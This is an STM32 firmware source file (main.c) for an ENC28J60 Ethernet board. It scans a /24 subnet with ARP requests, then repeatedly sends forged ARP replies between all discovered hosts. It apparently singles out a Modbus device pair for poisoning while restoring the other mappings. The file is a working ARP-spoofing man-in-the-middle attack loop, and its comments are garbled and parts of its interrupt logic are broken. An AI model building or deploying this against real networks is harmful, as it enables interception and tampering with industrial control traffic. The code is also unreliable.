/* USER CODE BEGIN Header */
/**
  ******************************************************************************
  * @file           : main.c
  * @brief          : Main program body
  ******************************************************************************
  * @attention
  *
  * <h2><center>&copy; Copyright (c) 2020 STMicroelectronics.
  * All rights reserved.</center></h2>
  *
  * This software component is licensed by ST under BSD 3-Clause license,
  * the "License"; You may not use this file except in compliance with the
  * License. You may obtain a copy of the License at:
  *                        opensource.org/licenses/BSD-3-Clause
  *
  ******************************************************************************
  */
/* USER CODE END Header */
/* Includes ------------------------------------------------------------------*/
#include "main.h"

/* Private includes ----------------------------------------------------------*/
/* USER CODE BEGIN Includes */
#include "enc28j60.h"
#include "net.h"
#include "uart.h"
#include "arp_fake.h"
#include "arp_reborn.h"
/* USER CODE END Includes */

/* Private typedef -----------------------------------------------------------*/
/* USER CODE BEGIN PTD */

/* USER CODE END PTD */

/* Private define ------------------------------------------------------------*/
/* USER CODE BEGIN PD */

/* USER CODE END PD */

/* Private macro -------------------------------------------------------------*/
/* USER CODE BEGIN PM */

/* USER CODE END PM */

/* Private variables ---------------------------------------------------------*/
SPI_HandleTypeDef hspi1;

TIM_HandleTypeDef htim2;

UART_HandleTypeDef huart1;

/* USER CODE BEGIN PV */
extern int ARP_table_index;
extern const  uint8_t macaddr[6];
char send_status = 1;
extern  struct
{
   uint8_t ip[4];
   uint8_t mac[6];
}ARP_table[5];
struct
{
   uint8_t ip[4];
   uint8_t mac[6];
}modbus_ARP_table[2];
extern char debug_string[60];
uint8_t ip_server[4]={192,168,0,0};
int count =0;
int led =1;
int dao=0;
char button = 0;
/* USER CODE END PV */

/* Private function prototypes -----------------------------------------------*/
void SystemClock_Config(void);
static void MX_GPIO_Init(void);
static void MX_SPI1_Init(void);
static void MX_USART1_UART_Init(void);
static void MX_TIM2_Init(void);
/* USER CODE BEGIN PFP */
extern void ARP_send_request_fake(uint8_t *ip_dest, uint8_t *ip_source, uint8_t * MAC_target);
void ARP_send_request_reborn(uint8_t *ip_dest, uint8_t *ip_source,uint8_t *MAC_dest, uint8_t * MAC_source);
extern void ARP_table_setIP(uint8_t *ip_set, uint8_t *mac_set);
extern int8_t ARP_table_checkIP(uint8_t *ip_check);

/* USER CODE END PFP */

/* Private user code ---------------------------------------------------------*/
/* USER CODE BEGIN 0 */
void HAL_TIM_PeriodElapsedCallback(TIM_HandleTypeDef *htim)
{
	 if(htim->Instance == TIM2)
	 {
		 ARP_clear_table();
	 }
}
void HAL_GPIO_EXTI_Callback(uint16_t GPIO_Pin)
{	
	if(GPIO_Pin == GPIO_PIN_0 && count==0)
	{
		if (GPIO_Pin == GPIO_PIN_11)  // Thay dúng chân INT c?a b?n
    {
        // Ð?t c? ho?c x? lý ng?t t?i dây
        // Ví d? don gi?n:
        extern volatile uint8_t enc_irq_flag;
        enc_irq_flag = 1;
    }
		button = 1;
		
	}
}



/* USER CODE END 0 */

/**
  * @brief  The application entry point.
  * @retval int
  */
int main(void)
{
  /* USER CODE BEGIN 1 */
			uint8_t zero_ip[4]={0,0,0,0};
	memcpy(ARP_table[1].ip, zero_ip, 4);
			int count_send = 0;
  /* USER CODE END 1 */

  /* MCU Configuration--------------------------------------------------------*/

  /* Reset of all peripherals, Initializes the Flash interface and the Systick. */
  HAL_Init();

  /* USER CODE BEGIN Init */

  /* USER CODE END Init */

  /* Configure the system clock */
  SystemClock_Config();

  /* USER CODE BEGIN SysInit */
	
  /* USER CODE END SysInit */

  /* Initialize all configured peripherals */
  MX_GPIO_Init();
  MX_SPI1_Init();
  MX_USART1_UART_Init();
  MX_TIM2_Init();
  /* USER CODE BEGIN 2 */
	UART_init(&huart1);
  ENC29J600_ini(&hspi1);
	HAL_TIM_Base_Start_IT(&htim2);
	UART_putString("Khoi tao thanh cong\r\n\nThuc hien quet....\r\n\n");
	
	
  /* USER CODE END 2 */

  /* Infinite loop */
  /* USER CODE BEGIN WHILE */
	//ARP_table_checkIP(ip_fake);
	//*ARP_table_setIP(ip_fake,mac_fake);
	//ARP_send_request(ip_server);
		for (int i=0;i<=255;i++)
		{
			ip_server[3]=i;
			ARP_send_request(ip_server);
      HAL_Delay(10);
		}
	volatile uint8_t enc_irq_flag = 0;
  while (1)
  {
    /* USER CODE END WHILE */
		if(button == 1)
		{
			for (int n=0;n<ARP_table_index;n++)
				{
					for (int m=n+1;m<ARP_table_index;m++)
						{

								//if(modbus_ARP_table[m].ip[3] != modbus_ARP_table[n].ip[3] )
									ARP_send_request_reborn(ARP_table[m].ip, ARP_table[n].ip, ARP_table[m].mac, ARP_table[n].mac);		
									HAL_Delay(10);			
									ARP_send_request_reborn(ARP_table[n].ip, ARP_table[m].ip, ARP_table[n].mac, ARP_table[m].mac);		
									HAL_Delay(10);									
							
								
						}
				}
				button = 0;
		}
		if (enc_irq_flag)
			{
					enc_irq_flag = 0;

					// G?i x? lý nh?n gói
					uint8_t rx_buf[512];
					uint16_t len = ENC28J60_read_packet(rx_buf, sizeof(rx_buf));
					if (len > 0)
					{
							// X? lý gói tin ? dây
					}
			}



			NET_loop();
			//HAL_Delay(10);
		if(send_status == 2 && count_send !=1000)
			count_send++;
		if(send_status == 1)
			{
				for (int n=0;n<ARP_table_index;n++)
				{
					for (int m=0;m<ARP_table_index;m++)
						{
							if(m!=n)
							{
								ARP_send_request_fake(ARP_table[m].ip, ARP_table[n].ip, ARP_table[m].mac);
								HAL_Delay(10);
							}						
						}
				}
				send_status = 0;
			}
			else if(send_status == 2 && count_send == 1000)
			{
				for (int n=0;n<ARP_table_index;n++)
				{
					for (int m=n+1;m<ARP_table_index;m++)
						{
							if(modbus_ARP_table[1].ip[3] == ARP_table[n].ip[3] && modbus_ARP_table[0].ip[3] == ARP_table[m].ip[3])
							{
								continue;
							}	
							else if(modbus_ARP_table[0].ip[3] == ARP_table[n].ip[3] && modbus_ARP_table[1].ip[3] == ARP_table[m].ip[3])
							{
								continue;
							}	
							else
							{
								//if(modbus_ARP_table[m].ip[3] != modbus_ARP_table[n].ip[3] )
									ARP_send_request_reborn(ARP_table[m].ip, ARP_table[n].ip, ARP_table[m].mac, ARP_table[n].mac);		
									HAL_Delay(10);			
									ARP_send_request_reborn(ARP_table[n].ip, ARP_table[m].ip, ARP_table[n].mac, ARP_table[m].mac);		
									HAL_Delay(10);									
							}
								
						}
				}
				count_send =0;
				send_status = 3;
			}
//			else if(send_status == 3)
//			{
//				ARP_send_request_fake(modbus_ARP_table[0].ip, modbus_ARP_table[1].ip, modbus_ARP_table[0].mac);
//				ARP_send_request_fake(modbus_ARP_table[1].ip, modbus_ARP_table[0].ip, modbus_ARP_table[1].mac);
//				send_status = 4;
//			}
			
//		if(memcmp(ARP_table[1].ip, zero_ip, 4) != 0 && led == 1)
//		{
//			HAL_GPIO_WritePin(GPIOB,GPIO_PIN_10,GPIO_PIN_RESET);
//			HAL_Delay(200);
//			HAL_GPIO_WritePin(GPIOB,GPIO_PIN_10,GPIO_PIN_SET);
//			HAL_Delay(200);
//		}
    /* USER CODE BEGIN 3 */

  }

  /* USER CODE END 3 */
}

/**
  * @brief System Clock Configuration
  * @retval None
  */
void SystemClock_Config(void)
{
  RCC_OscInitTypeDef RCC_OscInitStruct = {0};
  RCC_ClkInitTypeDef RCC_ClkInitStruct = {0};

  /** Initializes the RCC Oscillators according to the specified parameters
  * in the RCC_OscInitTypeDef structure.
  */
  RCC_OscInitStruct.OscillatorType = RCC_OSCILLATORTYPE_HSE;
  RCC_OscInitStruct.HSEState = RCC_HSE_ON;
  RCC_OscInitStruct.HSEPredivValue = RCC_HSE_PREDIV_DIV1;
  RCC_OscInitStruct.HSIState = RCC_HSI_ON;
  RCC_OscInitStruct.PLL.PLLState = RCC_PLL_ON;
  RCC_OscInitStruct.PLL.PLLSource = RCC_PLLSOURCE_HSE;
  RCC_OscInitStruct.PLL.PLLMUL = RCC_PLL_MUL9;
  if (HAL_RCC_OscConfig(&RCC_OscInitStruct) != HAL_OK)
  {
    Error_Handler();
  }

  /** Initializes the CPU, AHB and APB buses clocks
  */
  RCC_ClkInitStruct.ClockType = RCC_CLOCKTYPE_HCLK|RCC_CLOCKTYPE_SYSCLK
                              |RCC_CLOCKTYPE_PCLK1|RCC_CLOCKTYPE_PCLK2;
  RCC_ClkInitStruct.SYSCLKSource = RCC_SYSCLKSOURCE_PLLCLK;
  RCC_ClkInitStruct.AHBCLKDivider = RCC_SYSCLK_DIV1;
  RCC_ClkInitStruct.APB1CLKDivider = RCC_HCLK_DIV2;
  RCC_ClkInitStruct.APB2CLKDivider = RCC_HCLK_DIV1;

  if (HAL_RCC_ClockConfig(&RCC_ClkInitStruct, FLASH_LATENCY_2) != HAL_OK)
  {
    Error_Handler();
  }
}

/**
  * @brief SPI1 Initialization Function
  * @param None
  * @retval None
  */
static void MX_SPI1_Init(void)
{

  /* USER CODE BEGIN SPI1_Init 0 */

  /* USER CODE END SPI1_Init 0 */

  /* USER CODE BEGIN SPI1_Init 1 */

  /* USER CODE END SPI1_Init 1 */
  /* SPI1 parameter configuration*/
  hspi1.Instance = SPI1;
  hspi1.Init.Mode = SPI_MODE_MASTER;
  hspi1.Init.Direction = SPI_DIRECTION_2LINES;
  hspi1.Init.DataSize = SPI_DATASIZE_8BIT;
  hspi1.Init.CLKPolarity = SPI_POLARITY_LOW;
  hspi1.Init.CLKPhase = SPI_PHASE_1EDGE;
  hspi1.Init.NSS = SPI_NSS_SOFT;
  hspi1.Init.BaudRatePrescaler = SPI_BAUDRATEPRESCALER_8;
  hspi1.Init.FirstBit = SPI_FIRSTBIT_MSB;
  hspi1.Init.TIMode = SPI_TIMODE_DISABLE;
  hspi1.Init.CRCCalculation = SPI_CRCCALCULATION_DISABLE;
  hspi1.Init.CRCPolynomial = 10;
  if (HAL_SPI_Init(&hspi1) != HAL_OK)
  {
    Error_Handler();
  }
  /* USER CODE BEGIN SPI1_Init 2 */

  /* USER CODE END SPI1_Init 2 */

}

/**
  * @brief TIM2 Initialization Function
  * @param None
  * @retval None
  */
static void MX_TIM2_Init(void)
{

  /* USER CODE BEGIN TIM2_Init 0 */

  /* USER CODE END TIM2_Init 0 */

  TIM_ClockConfigTypeDef sClockSourceConfig = {0};
  TIM_MasterConfigTypeDef sMasterConfig = {0};

  /* USER CODE BEGIN TIM2_Init 1 */

  /* USER CODE END TIM2_Init 1 */
  htim2.Instance = TIM2;
  htim2.Init.Prescaler = 7200-1;
  htim2.Init.CounterMode = TIM_COUNTERMODE_UP;
  htim2.Init.Period = 10000;
  htim2.Init.ClockDivision = TIM_CLOCKDIVISION_DIV1;
  htim2.Init.AutoReloadPreload = TIM_AUTORELOAD_PRELOAD_DISABLE;
  if (HAL_TIM_Base_Init(&htim2) != HAL_OK)
  {
    Error_Handler();
  }
  sClockSourceConfig.ClockSource = TIM_CLOCKSOURCE_INTERNAL;
  if (HAL_TIM_ConfigClockSource(&htim2, &sClockSourceConfig) != HAL_OK)
  {
    Error_Handler();
  }
  sMasterConfig.MasterOutputTrigger = TIM_TRGO_RESET;
  sMasterConfig.MasterSlaveMode = TIM_MASTERSLAVEMODE_DISABLE;
  if (HAL_TIMEx_MasterConfigSynchronization(&htim2, &sMasterConfig) != HAL_OK)
  {
    Error_Handler();
  }
  /* USER CODE BEGIN TIM2_Init 2 */

  /* USER CODE END TIM2_Init 2 */

}

/**
  * @brief USART1 Initialization Function
  * @param None
  * @retval None
  */
static void MX_USART1_UART_Init(void)
{

  /* USER CODE BEGIN USART1_Init 0 */

  /* USER CODE END USART1_Init 0 */

  /* USER CODE BEGIN USART1_Init 1 */

  /* USER CODE END USART1_Init 1 */
  huart1.Instance = USART1;
  huart1.Init.BaudRate = 115200;
  huart1.Init.WordLength = UART_WORDLENGTH_8B;
  huart1.Init.StopBits = UART_STOPBITS_1;
  huart1.Init.Parity = UART_PARITY_NONE;
  huart1.Init.Mode = UART_MODE_TX_RX;
  huart1.Init.HwFlowCtl = UART_HWCONTROL_NONE;
  huart1.Init.OverSampling = UART_OVERSAMPLING_16;
  if (HAL_UART_Init(&huart1) != HAL_OK)
  {
    Error_Handler();
  }
  /* USER CODE BEGIN USART1_Init 2 */

  /* USER CODE END USART1_Init 2 */

}

/**
  * @brief GPIO Initialization Function
  * @param None
  * @retval None
  */
static void MX_GPIO_Init(void)
{
  GPIO_InitTypeDef GPIO_InitStruct = {0};
/* USER CODE BEGIN MX_GPIO_Init_1 */
/* USER CODE END MX_GPIO_Init_1 */

  /* GPIO Ports Clock Enable */
  __HAL_RCC_GPIOD_CLK_ENABLE();
  __HAL_RCC_GPIOA_CLK_ENABLE();
  __HAL_RCC_GPIOB_CLK_ENABLE();

  /*Configure GPIO pin Output Level */
  HAL_GPIO_WritePin(GPIOB, GPIO_PIN_1, GPIO_PIN_SET);

  /*Configure GPIO pins : PB0 PB11 */
  GPIO_InitStruct.Pin = GPIO_PIN_0|GPIO_PIN_11;
  GPIO_InitStruct.Mode = GPIO_MODE_IT_FALLING;
  GPIO_InitStruct.Pull = GPIO_PULLUP;
  HAL_GPIO_Init(GPIOB, &GPIO_InitStruct);

  /*Configure GPIO pin : PB1 */
  GPIO_InitStruct.Pin = GPIO_PIN_1;
  GPIO_InitStruct.Mode = GPIO_MODE_OUTPUT_PP;
  GPIO_InitStruct.Pull = GPIO_PULLUP;
  GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_HIGH;
  HAL_GPIO_Init(GPIOB, &GPIO_InitStruct);

  /* EXTI interrupt init*/
  HAL_NVIC_SetPriority(EXTI0_IRQn, 0, 0);
  HAL_NVIC_EnableIRQ(EXTI0_IRQn);

  HAL_NVIC_SetPriority(EXTI15_10_IRQn, 0, 0);
  HAL_NVIC_EnableIRQ(EXTI15_10_IRQn);

/* USER CODE BEGIN MX_GPIO_Init_2 */
/* USER CODE END MX_GPIO_Init_2 */
}

/* USER CODE BEGIN 4 */

/* USER CODE END 4 */

/**
  * @brief  This function is executed in case of error occurrence.
  * @retval None
  */
void Error_Handler(void)
{
  /* USER CODE BEGIN Error_Handler_Debug */
  /* User can add his own implementation to report the HAL error return state */

  /* USER CODE END Error_Handler_Debug */
}

#ifdef  USE_FULL_ASSERT
/**
  * @brief  Reports the name of the source file and the source line number
  *         where the assert_param error has occurred.
  * @param  file: pointer to the source file name
  * @param  line: assert_param error line source number
  * @retval None
  */
void assert_failed(uint8_t *file, uint32_t line)
{
  /* USER CODE BEGIN 6 */
  /* User can add his own implementation to report the file name and line number,
     tex: printf("Wrong parameters value: file %s on line %d\r\n", file, line) */
  /* USER CODE END 6 */
}
#endif /* USE_FULL_ASSERT */
